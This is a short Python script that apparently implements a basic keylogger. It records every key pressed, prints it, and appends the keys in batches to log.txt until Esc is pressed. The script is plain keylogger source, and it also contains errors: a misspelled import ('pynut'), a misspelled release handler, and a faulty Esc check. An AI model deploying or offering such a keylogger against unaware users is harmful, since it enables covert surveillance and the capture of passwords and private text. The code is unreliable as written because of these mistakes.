from pynut.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys_list):
    with open ("log.txt", "a") as f:
        for key in keys_list:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("-")
            elif k.find("key") == -1:
                f.write(k)

def on_relese(key):
    if key == key.esc:
        return False

with Listener(on_press = on_press, on_release = on_relese) as listener:
    listener.join()
